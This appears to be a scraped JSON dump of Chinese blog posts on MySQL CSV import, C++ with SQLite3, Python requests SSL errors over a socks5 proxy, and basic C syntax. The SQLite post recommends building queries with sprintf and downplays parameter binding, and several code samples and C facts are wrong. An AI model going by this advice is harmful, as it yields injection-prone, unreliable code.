关于字符编码问题的补充 其实可以通过指定导入的csv文件编码来保证字符编码问题，使用如下命令\nLOAD DATA INFILE \"D:/CoderLife/testMySQL/test.csv\" -- 指定csv文件路径，路径必须是我们一开始设置的 INTO TABLE nation CHARACTER SET utf8-- 指定你要插入的表格 FIELDS TERMINATED BY ',' -- 指定csv文件是以逗号为分隔符 ENCLOSED BY '\"' -- 指定文本以双引号闭合 LINES TERMINATED BY \"\\r\\n\" -- 指定行按照如上格式换行 IGNORE 1 LINES -- 指定忽略第一行 (key1,key2,key3); -- 指定你需要导入的键 以上所有问题几乎都可以因为使用图形化界面而避免ㄟ( ▔, ▔ )ㄏ 意不意外，刺不刺激？？？\n","description":"","tags":["数据库"],"title":"MySQL导入csv文件数据","uri":"/posts/mysql%E5%AF%BC%E5%85%A5csv%E6%96%87%E4%BB%B6%E6%95%B0%E6%8D%AE/"},{"categories":["Code"],"content":"摘要 本文主要讲解了C++对接sqlite3数据库的配置以及相关操作 IDE：Visual Studio 2017 SQLite3 碎碎念 敲代码不接触数据库几乎是不可能的。但是很多学校开设的课程都是从Mysql开始的，导致很多学生一些项目就是Mysql。毫无疑问Mysql是很强大的，但是有的时候我们真的很需要因地制宜选择更加合适的数据库。其实还是因为C++\u0026Mysql的模式本垃圾配置不来\nSQLite3 简介 SQLite是一个进程内的库，实现了完全的自给自足的，无服务器的，零配置的，事务性的SQL数据库引擎。 零配置意味着你不需要在任何一台机器上像mysql一样进行复杂的配置 SQLite正如其名，轻量级，操作方便。毫无疑问相对于功能强大的mysql它缺少了很多相应的其他功能，但是如果你不准备采取分布式结构分离数据应用，复杂的数据库功能，只是需要一个轻量化便捷的数据库基础功能，SQLite是你最好的选择 嗯，sqlite的c++API也不像mysql的那么变态 下载SQLite3 依据你的需要的系统版本在SQLite官方下载源代码版本 官方下载界面\nSQLite官方给出了编译好的动态链接库方便开发，不过本教程以源代码入手（因为只要配置正确相较于动态链接库文件，本方法调用更为简单，并且效率更高）\n如图我们选择第一个下载。下载完成之后我们解压到当前文件夹，并修改文件夹为sqlite。把文件夹移动到我们自己的项目里，并在IDE中引入该文件夹。（具体怎么引入瞎几把发挥啦，随你是添加额外项目还是添加额外包含目录，搞通就行hhh）\nSQLite3的基础操作 sqlite遵循最基本的通用sql语句。所以大部分操作与mysql等一系列其他数据库无差异 你可以从sqlite3官网下载exe可执行文件用以访问sqlite生成的数据库文件，在可执行文件内，基础的支持命令如下： sqlite3.exe ./test.db //在命令行内使用该命令连接指定数据库文件，不存在则创建 命令 作用 .backup ?DB? FILE 备份 DB 数据库（默认是 \"main\"）到 FILE 文件。 .bail ON OFF .databases 列出数据库的名称及其所依附的文件。 .dump ?TABLE? 以 SQL 文本格式转储数据库。如果指定了 TABLE 表，则只转储匹配 LIKE 模式的 TABLE 表。 .echo ON OFF .exit 退出 SQLite 提示符。 .explain ON OFF .header(s) ON OFF .help 显示帮助消息。 .import FILE TABLE 导入来自 FILE 文件的数据到 TABLE 表中。 .indices ?TABLE? 显示所有索引的名称。如果指定了 TABLE 表，则只显示匹配 LIKE 模式的 TABLE 表的索引。 .load FILE ?ENTRY? 加载一个扩展库。 .log FILE off .mode MODE 设置输出模式，MODE 可以是下列之一： csv 逗号分隔的值 column 左对齐的列 html HTML 的 \u003ctable\u003e 代码 insert TABLE 表的 SQL 插入（insert）语句 line 每行一个值 list 由 .separator 字符串分隔的值 tabs 由 Tab 分隔的值 tcl TCL 列表元素 - - .nullvalue STRING 在 NULL 值的地方输出 STRING 字符串。 .output FILENAME 发送输出到 FILENAME 文件。 .output stdout 发送输出到屏幕。 .print STRING... 逐字地输出 STRING 字符串。 .prompt MAIN CONTINUE 替换标准提示符。 .quit 退出 SQLite 提示符。 .read FILENAME 执行 FILENAME 文件中的 SQL。 .schema ?TABLE? 显示 CREATE 语句。如果指定了 TABLE 表，则只显示匹配 LIKE 模式的 TABLE 表。 .separator STRING 改变输出模式和 .import 所使用的分隔符。 .show 显示各种设置的当前值。 .stats ON OFF .tables ?PATTERN? 列出匹配 LIKE 模式的表的名称。 .timeout MS 尝试打开锁定的表 MS 毫秒。 .width NUM NUM 为 \"column\" 模式设置列宽度。 .timer ON OFF 使用C++连接SQLite并执行一条sql语句 #include\u003ciostream\u003e #include\u003csqlite3.h\u003e using namespace std; //需要执行的sql语句 const char sql[] = { \"CREATE TABLE IF NOT EXISTS Users(\" \"ID INTEGER PRIMARY KEY NOT NULL,\" \"Stu_ID INTEGER,\" \"Password TEXT\" \");\" }; int main(){ sqlite3 *db=NULL; //数据库句柄 char *ErrMsg=NULL; //错误信息指针 int rc=0; //函数执行返回值 DATABASE=\"./test.db\"//需要连接的数据库路径 //连接数据库，并将返回的数据库句柄交给db rc=sqlite3_open(DATABASE,\u0026db); if (rc){ //如果链接失败关闭句柄退出程序 sqlite3_close(db); cout\u003c\u003c\"Cannot connect to \"\u003c\u003cDATABASE\u003c\u003cendl; return 0; } //执行sql语句 rc=sqlite3_exec(db,sql,NULL,NULL,\u0026ErrMsg); if (rc){ 如果执行失败关闭句柄，打印出错误信息，退出程序 sqlite3_close(db); cout\u003c\u003c\"sql execute failed...\"\u003c\u003cendl; cout\u003c\u003cErrMsg\u003c\u003cendl; return 0; } cout\u003c\u003c\"table create\"\u003c\u003cendl; //关闭数据库句柄释放内存 sqlite3_close(db); return 0; } sqlite3_open(const char *filename,sqlite3 **ppDb)\n该函数用以打开指定数据库（不存在则创建），并返回一个数据库连接对象。函数返回值表示执行成功与否。 如果filename为:memory:，sqlite将会在内存里创建一个数据库\nsqlite3_exec(sqlite3* db,const char *sql,sqlite_callback,void *data,char **ErrMsg)\n该函数用以执行sql语句，sql语句可以是一条也可以是多条。\nsqlite3* db 数据库连接句柄 const char *sql 需要执行的sql语句 sqlite_callback 执行成功后的回调函数 void *data 回调函数参数 char **ErrMsg 错误信息 sqlite3_close(sqlite3* db)\n该函数用以关闭数据库连接，释放内存。所有相关sql语句都应该在连接关闭之前完成，如果仍有sql语句在执行，该函数将返回SQLITE_BUSY错误\nsqlite3回调函数 什么是回调函数\nSQLite中的回调函数可以让我们自定义sql语句执行完成之后的操作。sqlite3_exec中执行的sql语句的执行结果会被默认传递给回调函数（如果你定义了的话）\nsqlite3_exec(db,\"select * from users;\",callback,\"helloworld\",\u0026ErrMsg) //该回调函数将会在sql语句执行时每一行数据返回时被执行 static int callback(void *data,int argc,char **argv,char **azColName){ //同时会打印由sqlite3_exec传入的参数\"helloworld\" printf(\"%s\",(char*)data); for(int i=0;i\u003cargc;i++){ printf(\"%s : %s\\n\",azColName[i],argv[i]?argv[i]:\"NULL\"); } return 0; } 不用回调函数获取sql结果 sqlite的回调函数尽管已经很方便，但是对于某些情景的应用时却力不从心，有什么办法可以不适用回调函数也获取sql的执行结果么？答案是有的 void func(){ sqlite3 *db=NULL; //定义数据库句柄 sqlite3_stmt* stmt=NULL;//Statement handle 能令sqlite3_step()执行的编译好的准备语句的指针。调用sqlite3_finalize()删除它。 const char *zTail=NULL; //Pointer to unusedportion of zSql 当zSql在遇见终止符或者达到设定的nByte结束后，如果还有剩余的内容，那么这些剩余的内容将被存放到pzTail中，不包含终止符 const char sql[]=\"select ID from users;\" int rc; rc=sqlite3_open(\"./test.db\",\u0026db); if (rc) return; //准备sql语句 if (sqlite3_prepare_v2(db,sql,strlen(sql),\u0026stmt,\u0026zTail)==SQLITE_OK){ //步进执行，并获取执行结果 while (sqlite3_step(stmt)==SQLITE_ROW) print(\"%d\\n\",sqlite3_column_int(stmt,0)); /* sqlite3_column_int(stmt,0) 第二个参数表示sql语句返回的数据的列数，从0开始，本例子中的sql语句只选取了ID那一列，所以这里只用数字0 sqlite3_column_text()用以获取字符串类型返回值 sqlite3_column_int64()用以获取int64大小的返回值 */ } //释放资源 sqlite3_finalize(stmt); sqlite3_close(db); return; } sqlite还有很多其他的函数用以获取sql语句执行结果，详情可以参见官方文档\n构造sql语句并执行 尽管一旦程序中有接收用户参数动态构造sql语句的程序实现，就通常意味着sql注入漏洞的存在，但是数据库与用户输入数据的交互几乎是不可能不存在的。所以下面我们介绍有关构造sql语句的方法 使用字符串处理函数（个人安利）\nsql语句本质是一段字符串，所以我们可以直接使用c++自带的字符串处理函数用以绑定参数，动态构造sql语句\nint id=1; //首先定义一个字符数组用以存放动态生成的sql语句 char sql[1024]={0}; //使用相对安全的没有缓冲区溢出漏洞的sprintf_s构造sql语句 sprintf_s(sql,1024,\"select * from users where ID=%d\",id); //如果你的编译器不支持sprintf_s()函数，也可使用相对不安全的sprintf()函数 sprintf(sql,\"select * from users where ID=%d\",id); //执行sql语句，这里函数换成sqlite3_prepare_v2()也是一样 sqlite3_exec(db,sql,NULL,NULL,\u0026Errmsg); 使用sqlite3自带的绑定参数函数\nint id=1; char sql[1024]=\"select * from users where ID=?\"; sqlite3_stmt *stmt=NULL; sqlite3_prepare_v2(db,sql,strlen(sql),\u0026stmt,NULL); //绑定整形参数到对应位置，参数位置从1开始 sqlite3_bind_int(stmt,1,id); /* sqlite3_bind_text(stmt,pos,\"halloworld\",strlen(\"halloworld\"),SQLITE_STATIC) */ ... 据说使用sqlite3_bind_*()函数相对使用字符串处理函数更为节省内存，有一定程度可以规避sql注入攻击的效果（这里我感觉不是很苟同，这段是网上说的）\n中文字符编码问题 Visual studio等一众Win下的IDE，编辑器默认编码不是utf-8，而sqlite3默认的字符编码是utf-8.于是又到了我们喜闻乐见的字符编码问题。这里给大家安利一波函数，方便的进行字符格式转换。\n请将如下代码全部纳入你的项目中因为函数之间存在相互调用问题\n//UTF-8转Unicode std::wstring Utf82Unicode(const std::string\u0026 utf8string) { int widesize = ::MultiByteToWideChar(CP_UTF8, 0, utf8string.c_str(), -1, NULL, 0); if (widesize == ERROR_NO_UNICODE_TRANSLATION) { throw std::exception(\"Invalid UTF-8 sequence.\"); } if (widesize == 0) { throw std::exception(\"Error in conversion.\"); } std::vector\u003cwchar_t\u003e resultstring(widesize); int convresult = ::MultiByteToWideChar(CP_UTF8, 0, utf8string.c_str(), -1, \u0026resultstring[0], widesize); if (convresult != widesize) { throw std::exception(\"La falla!\"); } return std::wstring(\u0026resultstring[0]); } //unicode 转为 ascii std::string WideByte2Acsi(std::wstring\u0026 wstrcode) { int asciisize = ::WideCharToMultiByte(CP_OEMCP, 0, wstrcode.c_str(), -1, NULL, 0, NULL, NULL); if (asciisize == ERROR_NO_UNICODE_TRANSLATION) { throw std::exception(\"Invalid UTF-8 sequence.\"); } if (asciisize == 0) { throw std::exception(\"Error in conversion.\"); } std::vector\u003cchar\u003e resultstring(asciisize); int convresult = ::WideCharToMultiByte(CP_OEMCP, 0, wstrcode.c_str(), -1, \u0026resultstring[0], asciisize, NULL, NULL); if (convresult != asciisize) { throw std::exception(\"La falla!\"); } return std::string(\u0026resultstring[0]); } //utf-8 转 ascii std::string UTF_82ASCII(std::string\u0026 strUtf8Code) { using namespace std; string strRet = \"\"; //先把 utf8 转为 unicode wstring wstr = Utf82Unicode(strUtf8Code); //最后把 unicode 转为 ascii strRet = WideByte2Acsi(wstr); return strRet; } //ascii 转 Unicode std::wstring Ascii2WideByte(std::string\u0026 strascii) { using namespace std; int widesize = MultiByteToWideChar(CP_ACP, 0, (char*)strascii.c_str(), -1, NULL, 0); if (widesize == ERROR_NO_UNICODE_TRANSLATION) { throw std::exception(\"Invalid UTF-8 sequence.\"); } if (widesize == 0) { throw std::exception(\"Error in conversion.\"); } std::vector\u003cwchar_t\u003e resultstring(widesize); int convresult = MultiByteToWideChar(CP_ACP, 0, (char*)strascii.c_str(), -1, \u0026resultstring[0], widesize); if (convresult != widesize) { throw std::exception(\"La falla!\"); } return std::wstring(\u0026resultstring[0]); } //Unicode 转 Utf8 std::string Unicode2Utf8(const std::wstring\u0026 widestring) { using namespace std; int utf8size = ::WideCharToMultiByte(CP_UTF8, 0, widestring.c_str(), -1, NULL, 0, NULL, NULL); if (utf8size == 0) { throw std::exception(\"Error in conversion.\"); } std::vector\u003cchar\u003e resultstring(utf8size); int convresult = ::WideCharToMultiByte(CP_UTF8, 0, widestring.c_str(), -1, \u0026resultstring[0], utf8size, NULL, NULL); if (convresult != utf8size) { throw std::exception(\"La falla!\"); } return std::string(\u0026resultstring[0]); } //ascii 转 Utf8 std::string ASCII2UTF_8(std::string\u0026 strAsciiCode) { using namespace std; string strRet(\"\"); //先把 ascii 转为 unicode wstring wstr = Ascii2WideByte(strAsciiCode); //最后把 unicode 转为 utf8 strRet = Unicode2Utf8(wstr); return strRet; } ","description":"","tags":["C/C++","数据库"],"title":"C++与SQLite","uri":"/posts/c-%E4%B8%8Esqlite/"},{"categories":["Code"],"content":"问题背景 这是遇到的一个天坑！ 这么过分的坑一定要写下来！！！！ 项目需求： 爬取一个位于国外的网站，所以需要使用proxy，这里使用socks5代理 网站是https，所以需要ssl 就是在这的需求之下，代码持续爆出如下错误： requests.exceptions.SSLError: SOCKSHTTPSConnectionPool(host='www.xxx.org', port=443): Max retries exceeded with url: /file/ (Caused by SSLError(SSLError(\"bad handshake: SysCallError(-1, 'Unexpected EOF')\"))) requests.exceptions.ConnectionError: SOCKSHTTPSConnectionPool(host='www.xxx.org', port=443): Max retries exceeded with url: /file/ (Caused by NewConnectionError('\u003curllib3.contrib.socks.SOCKSHTTPSConnection object at 0x0000021C585105C0\u003e: Failed to establish a new connection: [Errno 11001] getaddrinfo failed')) requests.exceptions.SSLError: HTTPSConnectionPool(host='msft.com', port=443): Max retries exceeded with url: / (Caused by SSLError(\"Can't connect to HTTPS URL because the SSL module is not available.\")) ...... 本文就来好好踩踩这些坑 SSL module is not available 出现如上错误表明程序未能正确加载引用ssl\n如果你是linux系统，linux系统使用源码编译出来的python在编译过程种没有设定编译ssl库，建议重新编译安装python。或者尝试通过pip安装openssl\n如果你是一个win下的conda用户，首先也可以尝试使用conda安装缺失的openssl库。\n如果openssl本来就已经存在了，但是代码还是出现如上报错，并且你是使用某些编辑器（列如vscode）编写python脚本的，可能是因为安装好的openssl由于缺少环境变量的支持无法被程序正确的调用，你可以通过配置环境变量，或者在conda的命令行里运行你编写的脚本 bad handshake: SysCallError(-1, 'Unexpected EOF') 这是最坑的一个错误\n错误的握手包。\n新版本的openssl将有漏洞的cipher禁用了，使用TSL1.0一下的cipher都无法匹配。这在新版本的requests中也是如此。 解决方法有人说是降低requests版本，还有一个方法是在代理服务器地址写成如下格式\n# socks5h://127.0.0.1:1080 r=requests.get(URL,proxies={\"https\":\"socks5h://127.0.0.1:1080\"}) 对就是加了个h\n加h的含义： socks5h:// socks4a:// 表示主机名由socks服务器解析; socks5:// socks4:// 表示主机名在本地解析 ","description":"","tags":["Python","爬虫"],"title":"Python requests ssl报错","uri":"/posts/python-requests-ssl%E6%8A%A5%E9%94%99/"},{"categories":["Code"],"content":"前言： 这是一篇有关C语言语法基础的精炼概述性质文章，不会涉及C语言一些有深度的内容 本文面向的是以大学C考试过关为目标，以计算机二级认证为目标，期望获得一个C语言最基础认识的读者 博主能力有限，可能某些知识点未能讲解清晰，某些知识点遗漏，甚至某些知识点错误，若发现以上问题欢迎邮件勘误。 Start C语言基本结构 #include\u003cstdio.h\u003e int main(){ /* 这是每个程序的开始 */ printf(\"Hello World!\\n\"); //这是另一种注释方法 return 0; } 所有C语言程序都包含一个main()函数，程序从main()函数开始执行，每个函数用花括号“{}”包括。\nC语言有两种添加注释方法\n以“//”开头的单行注释 以“/**/”包裹的多行注释，或者叫块注释 stdio.h是一个头文件（标准输入输出头文件，这个头文件内包含printf函数的定义与实现，如果没有找到stdio.h，printf函数会出现编译错误）。\n#include 是一个预处理命令（c语言中以#开头的命令称为预处理命令，类似还有#define）用来引入头文件。\nreturn 0; 用于退出程序，并向操作系统返回一个数值0.\n每一句完整的c语言代码用分号“;”（英文小写）作为结束符号\nC语言简介 百度百科\n维基百科\n重点\nC语言是一门面向过程的高级语言 C语言仍然保持跨平台特性 未完待续。。。 编写环境 这里仅为初学者，没有开发项目需求的读者推荐以下开发软件\n软件名称超链接对应的软件的基本操作入门，Download超链接为下载地址。这里提供的软件下载地址部分是国外网站，如果无法打开可以百度软件名下载\n软件 简介 链接 Dev C++ 个人觉得最适合新手的集成开发环境，同时具有简单项目的开发能力。傻瓜式安装即点即用同时支持中文，缺点大概是无法跨平台（需要跨平台的也就不是新手了） Download Code Blocks 很多文章鼓吹的集成开发环境，博主本人没有使用过，但是口碑一直不错。作为一款开源软件同时支持跨平台就是其优点 Download Visual C++ 6.0 微软老牌集成开发环境，个人感觉几近过时是前计算机二级指定开发环境除非是学习单片机开发的，或者熟悉二级考试环境，不建议使用 Download Visual Studio 2010 微软集成开发环境，全国计算机二级新标准指定的软件 Download Visual Studio (latest) 不是很推荐新手使用最新版的Visual Studio，微软最新的vs对诸多c++语法做了安全方面的限制 No Download 基本数据类型 在了解基本数据类型之前我们需要对计算机存储空间单位换算有个基本概念\n最小单位bit（位）：即一个二进制位 Byte（字节）：1 Byte=8 bit KB（千字节）：1 KB=1024 Byte MB（兆字节）：1 MB=1024 KB GB（吉字节）：1 GB=1024 MB TB（太字节）：1 TB=1024 GB 更多相关资料链接\n整数类型 类型 存储大小 取值范围 char 1 byte -2^7~2^7-1 int 2 byte（32bit）4 Byte（64bit） -2^15~2^15-1 -2^31~2^31-1 short 2 byte -2^15~2^15-1 long 4 byte -2^31~2^31-1 int型在32位程序和64位程序中所能表示的范围是不一样的，所以表中会有两个范围.\n重点:\n结合之前对存储单位的科普。我们知道1 Byte=8bit即1字节等于8个比特位。计算机内部其实只认识1和0，也就是二进制。所以计算机对任何数据的处理都是转换成对应的二进制。1字节对应8个二进制位即：\n00000000 -- 11111111 用8个位子随意组合摆放0，1可以由2^8种组合，计算机内部将这2^8种组合在一一映射到实际的数值上。列如：\n00000000 --\u003e -2^7=-128 00000001 --\u003e -2^7+1=-127 ··· 10000000 --\u003e 0 10000001 --\u003e 1 ··· 11111111 --\u003e 2^7-1=127 所以我们就有了\nchar 1 Byte（字节）范围 -2^7~2^7 即 -128~127 其他类型也可以同样的方法计算范围。也正如表中所给的数值范围，全部以2的次幂记忆。如:\nint 在64位下 大小为4Byte（字节） 4 Byte=4*8 bit=32bit 也就是32个二进制bit位 所以int型的范围可以表示为 -2^31~2^31-1 （有没有奇怪为森魔要-1？因为数字0的存在） unsigned \u0026 signed 值得一提的是c语言种对基本数据类型还有两个修饰符可以使用：\nunsigned 中文释义：无符号 signed 中文释义：有符号 顾名思义，举例来说，如果我们使用unsigned修饰int型\nunsigned char x; /* 如此声明的这个变量x的取值范围就会变成 0~2^8-1 即 0-255 */ 而signed有符号，以上常用数据类型默认都是由signed（有符号修饰的）所以他们的范围从负数开始，如果你加上unsigned（无符号）那么所有的数据类型范围将是从0开始\n浮点类型 类型 存储大小 取值范围 精度 float 4 Byte 1.2E-38 ~ 3.4E+38 6位小数 double 8 Byte 2.3E-308 ~ 1.7E+308 15位小数 long double 16 Byte 3.4E-4932 ~ 1.1E+4932 19位小数 有关浮点型的相关问题属于较有深度的问题，这里不做探究 void类型 void类型呢是一个比较特殊的类型。\n用来修饰函数表明函数返回值位空，即不存在返回值 #include\u003cstdio.h\u003e void main(){ printf(\"hello world\"); return; } /* 还记得return吗，用于结束函数并向操作系统或者上级调用函数返回一个数值。如果这个函数是用void修饰的，列如这里的main()函数，这里return就不必返回一个数值（如果你还是写作return 0;还会报错） */ 用来修饰函数参数表明该函数不接受参数 #include\u003cstdio.h\u003e int func(void){ printf(\"hallo world\"); return 0; } int main(){ func(); return 0; } //其实默认括号内为空就表示没有参数，即void是可以省略的 用来修饰指针代表对象地址，而不是一个类型。（关于指针会在指针部分详解） 常量 常量，是写死在程序里，在程序运行过程中不可更改的量\n定义方法\n//所有基本数据类型均可以定义对应常量 #define N 100 #define Good true #define x 1.2345 #define newline '\\n' //你也可以使用那个const关键字定义常量 const double x=0.123456; 基本输入输出语句 #include\u003cstdio.h\u003e int main(){ int i; //声明整形变量i int x,y; //声明整形变量x，y float a; double b; char ch; //声明字符变量ch scanf(\"%d\",\u0026i); //从键盘输入数字i scanf(\"%d %d\",\u0026x,\u0026y); //从键盘同时输入数字x,y scanf(\"%f %lf\",\u0026a,\u0026b); scanf(\"%c\",\u0026ch); //从键盘读入一个字符ch printf(\"hallo world\\n\"); //打印固定字符串 printf(\"%d\\n\",i); //打印单个数字 printf(\"你输入的x=%d,y=%d\\n\",x,y);//格式化输出 printf(\"单精度a=%f;双精度b=%.3lf\",a,b);//打印输出浮点类型，并限制位数 printf(\"%c\",ch);//打印单个字符 return 0; } 以下是样例输入\n10 2 3 1.234 3.141592654 以下是输出\nhallo world 10 你输入的x=2,y=3 单精度a=1.234000;双精度b=3.142 你可能会奇怪不是应该还输入一个单个字符吗，为什么没有了，其实那个单个字符就是两个小数最后的回车符所以你也看到了我的输出其实多了一行，对那就是那个最后输入的回车符。 \"%.3f\"这个写法是限制小数后打印三位，默认四舍五入 请努力理解以上代码，结合下方给出的资料\n格式输出符号 格式输出符号 含义 %a 浮点数、十六进制数字和p-记数法（c99 %A 浮点数、十六进制数字和p-记法（c99） %c 一个字符(char) %C 一个ISO宽字符 %d 有符号十进制整数(int)（%ld、%Ld：长整型数据(long),%hd：输出短整形。） %e 浮点数、e-记数法 %E 浮点数、E-记数法 %f 单精度浮点数(默认float)、十进制记数法（%.nf 这里n表示精确到小数位后n位.十进制计数） %g 根据数值不同自动选择%f或%e． %G 根据数值不同自动选择%f或%e. %i 有符号十进制数（与%d相同） %o 无符号八进制整数 %p 指针 %s 对应字符串char*（%s = %hs = %hS 输出 窄字符） %S 对应宽字符串WCAHR*（%ws = %S 输出宽字符串） %u 无符号十进制整数(unsigned int) %x 使用十六进制数字0xf的无符号十六进制整数 %X 使用十六进制数字0xf的无符号十六进制整数 %% 打印一个百分号 %I64d 用于INT64 或者 long long %I64u 用于UINT64 或者 unsigned long long %I64x 用于64位16进制数据 基本常用的就是整数，小数，字符，字符串的输出。\n转义字符\n转义字符 含义 ASCII码值 \\a 响铃(BEL) 007 \\b 退格(BS) ，将当前位置移到前一列 008 \\f 换页(FF)，将当前位置移到下页开头 012 \\n 换行(LF) ，将当前位置移到下一行开头 010 \\r 回车(CR) ，将当前位置移到本行开头 013 \\t 水平制表(HT) （跳到下一个TAB位置） 009 \\v 垂直制表(VT) 011 \\\\ 代表一个反斜线字符''' 092\t​ ' 代表一个单引号（撇号）字符 039 \" 代表一个双引号字符 034 \\0 空字符(NULL) 000 \\ddd 1到3位八进制数所代表的任意字符 三位八进制 \\xhh 1到2位十六进制所代表的任意字符 二位十六进制 难点\nscanf()函数，以空格或者回车符作为截断。\nC语言中的输入输出缓冲区机制\n在C/C++中，输入输出事实上是各自有一个缓冲区的。缓冲区故名思意。\n在你的键盘，屏幕和程序实际获得输入之间还有一个缓冲区。\n你按下的按键会被先存放到缓冲区内，接着程序从输入缓冲区读取。处理完毕之后将输出写在输出缓冲区内，屏幕再从输出缓冲区内读取输出并显示给你。\n并不是你想象中的你按下的每一个字符都会直接被程序接收\n当再输入的时候涉及到了字符，或者字符串，并且你发现输入的数据并没有按照你的需要，按照你所想的进行，多半是因为在输入缓冲区内有你之前输入操作时遗留的字符在里面（简单举例，你使用scanf输入一个数字并且按下回车，数字被程序从输入缓冲区读取，但是遗留下来了一个回车符，如果你紧接着读取一个字符，就会出现你意料之外的情况，也就是上述输入输出示例代码中的情况。）\n当输入缓冲区出现问题时可以使用如下代码清除缓冲区：\nfflush(stdin); 然而并不是所有的编译器支持这个函数\n运算符 算术运算符 这里假设A=10，B=20\n运算符 含义 实列 + 把两个操作数相加 A + B 将得到 30 - 从第一个操作数中减去第二个操作数 A - B 将得到 -10 * 把两个操作数相乘 A * B 将得到 200 / 分子除以分母 B / A 将得到 2 % 取模运算符，整除后的余数 B % A 将得到 0 ++ 自增运算符，整数值增加 1 A++ 将得到 11 -- 自减运算符，整数值减少 1 A-- 将得到 9 重点 自增自减运算符的理解\n自增自减少运算符仅支持整数类型 逻辑关系 #include\u003cstdio.h\u003e int main(){ int x=0; printf(\"%d\\n\",x++); printf(\"%d\\n\",x); printf(\"%d\\n\",--x); printf(\"%d\\n\",x); return 0; } 样例输出 0 1 0 0 当这两个运算符出现在程序语句中时 如果位于变量前，则先执行自增（或自减）再执行程序语句 如果位于变量之后，则先执行程序语句，再进行自增（或自减） 除此之外c语言还支持如下的写法简化：\ni=i+1; 可以写作 i+=1; i=i*10; 可以写作 i*=10; i=i/2; 可以写作 i/=2; i=i-5; 可以写作 i-=5; 关系运算符 这里假设A=10，B=20\n运算符 描述 实例 == 检查两个操作数的值是否相等，如果相等则条件为真。 (A == B) 不为真。 != 检查两个操作数的值是否相等，如果不相等则条件为真。 (A != B) 为真。 \u003e 检查左操作数的值是否大于右操作数的值，如果是则条件为真。 (A \u003e B) 不为真。 \u003c 检查左操作数的值是否小于右操作数的值，如果是则条件为真。 (A \u003c B) 为真。 \u003e= 检查左操作数的值是否大于或等于右操作数的值，如果是则条件为真。 (A \u003e= B) 不为真。 \u003c= 检查左操作数的值是否小于或等于右操作数的值，如果是则条件为真。 (A \u003c= B) 为真。 逻辑运算符 这里假设A=10，B=20\n运算符 描述 实例 \u0026\u0026 称为逻辑与运算符。如果两个操作数都非零，则条件为真。 (A \u0026\u0026 B) 为假。 || 称为逻辑或运算符。如果两个操作数中有任意一个非零，则条件为真。 (A ! 称为逻辑非运算符。用来逆转操作数的逻辑状态。如果条件为真则逻辑非运算符将使其为假。 !(A \u0026\u0026 B) 为真。 按位运算符 位运算符作用于位，并逐位执行操作。\u0026、 | 和 ^ 的真值表如下所示：\np q p \u0026 q p | q p ^ q 0 0 0 0 0 0 1 0 1 1 1 1 1 1 0 1 0 0 1 1 假设如果 A = 60，且 B = 13，现在以二进制格式表示，它们如下所示：\nA = 0011 1100 B = 0000 1101 ----------------- A\u0026B = 0000 1100 A|B = 0011 1101 A^B = 0011 0001 ~A = 1100 0011 c语言中实际的位运算符 位运算符 描述 实列 \u0026 按位与操作，按二进制位进行\"与\"运算。 (A \u0026 B) 将得到 12，即为 0000 1100 | 按位或运算符，按二进制位进行\"或\"运算。 (A | B) 将得到 61，即为 0011 1101 ^ 异或运算符，按二进制位进行\"异或\"运算。 (A ^ B) 将得到 49，即为 0011 0001 ~ 取反运算符，按二进制位进行\"取反\"运算。 (~A ) 将得到 -61，即为 1100 0011，一个有符号二进制数的补码形式。 \u003c\u003c 二进制左移运算符。将一个运算对象的各二进制位全部左移若干位（左边的二进制位丢弃，右边补0）。 A \u003c\u003c 2 将得到 240，即为 1111 0000 \u003e\u003e 二进制右移运算符。将一个数的各二进制位全部右移若干位，正数左补0，负数左补1，右边丢弃。 A \u003e\u003e 2 将得到 15，即为 0000 1111 条件选择语句 c语言把任意非零，非空的值定义为true，把零或null定义为false 基本if语句 #include\u003cstdio.h\u003e int main(){ if (1) printf(\"hallo \"); if (true) { printf(\"world\"); } int x=10; if (x) printf(\"\\n\"); //求a,b,c种的最大值 int a=5,b=2,c=3; int ans; if (a\u003eb){ ans=a; } else{ if (b\u003ec){ ans=b; } else{ ans=c; } } printf(\"a=%d,b=%d,c=%d\\nMax=%d\\n\",a,b,c,ans); // \u0026\u0026且 ||或 if (a\u003eb \u0026\u0026 b\u003ec) printf(\"a\\n\"); if (a\u003eb || b\u003ec) printf(\"b\\n\"); return 0; } 输出如下\nhallo world a=5,b=2,c=3 Max=5 b 重点 c语言的条件判断语句具有短路性质\n在用\u0026\u0026连接的两个表达式A，B中。如果A的运算值为false，那么表达式B不会运算 在用||连接的两个表达式A，B中。如果A的运算值为true，那么表达式B不会运算 #include\u003cstdio.h\u003e int main(){ int a=1,b=2,c=3; if (a\u003eb \u0026\u0026 ++a) printf(\"Yes\\n\"); //这里由于a\u003eb不成立，所以a++不会被执行，所以a的值仍然为1,当然prinft语句也不会被执行 if (a\u003cb \u0026\u0026 ++a) printf(\"%d\\n\",a); //这里由于a\u003cb成立，所以a++也会被执行，这里会运行输出a数值2 if (b\u003cc || ++b) printf(\"%d\\n\",b); // ||也是如此，由于b\u003cc成立，于是b++也不会被执行，输出b的数值为2 return 0; } 样例输出\n2 2 三元运算符 #include\u003cstdio.h\u003e int main(){ int n; printf(\"请输入一个数字：\"); scanf(\"%d\",\u0026n); (n\u003e0)?printf(\"正数\\n\"):printf(\"负数\\n\"); return 0; } 样例输入\n请输入一个数字：12 样例输出\n正数 如上的三元运算符可以近似写成如下的if语句： if (n\u003e0) { printf(\"正数\"); } else { printf(\"负数\"); } switch语句 #include\u003cstdio.h\u003e int main(){ int n; printf(\"请输入一个数字：\"); scanf(\"%d\",\u0026n); switch (n){ case 1: printf(\"this is case 1\\n\"); case 2: printf(\"this is case 2\\n\"); break; default: printf(\"this is default\\n\"); } return 0; } 样例输入1\n1 样例输出1\nthis is case 1 this is case 2 样例输入2\n2 样例输出2\nthis is case 2 样例输入3\n3 样例输出3\nthis is default 重点\n每一个case语句分支必须以break;（即返回）结尾，否则case的条件分支都会继续往下执行。\n循环语句 for循环 #include\u003cstdio.h\u003e int main(){ // 统计1加到100的和 int i; int ans=0; for (i=0;i\u003c=100;i++){ ans=ans+i; } printf(\"%d\\n\",ans); return 0; } 样例输出\n5050 下面是 for 循环的控制流：\nfor ( init; condition; increment ) { statement(s); } init 会首先被执行，且只会执行一次。这一步允许您声明并初始化任何循环控制变量。您也可以不在这里写任何语句，只要有一个分号出现即可。 接下来，会判断 condition。如果为真，则执行循环主体。如果为假，则不执行循环主体，且控制流会跳转到紧接着 for 循环的下一条语句。 在执行完 for 循环主体后，控制流会跳回上面的 increment 语句。该语句允许您更新循环控制变量。该语句可以留空，只要在条件后有一个分号出现即可。 